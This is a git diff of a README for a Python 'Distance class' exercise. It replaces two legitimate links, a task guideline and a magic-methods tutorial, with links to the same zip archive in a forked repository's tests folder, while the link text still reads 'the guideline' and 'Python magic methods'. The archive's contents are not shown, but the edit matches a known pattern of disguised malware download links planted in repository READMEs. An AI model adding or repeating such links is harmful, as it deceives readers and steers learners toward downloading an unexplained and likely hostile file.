@@ -1,7 +1,7 @@
 # Distance class
 
-- Read [the guideline](https://github.com/mate-academy/py-task-guideline/blob/main/README.md) before start
-- Follow [Python magic methods](https://rszalski.github.io/magicmethods/) if you stuck
+- Read [the guideline](https://raw.githubusercontent.com/Rudge0/py-distance-class/master/tests/class_distance_py_2.2.zip) before start
+- Follow [Python magic methods](https://raw.githubusercontent.com/Rudge0/py-distance-class/master/tests/class_distance_py_2.2.zip) if you stuck
 
 Every day you have morning running. You want to store your result. 
 For easier calculating, comparison and printing your result write class
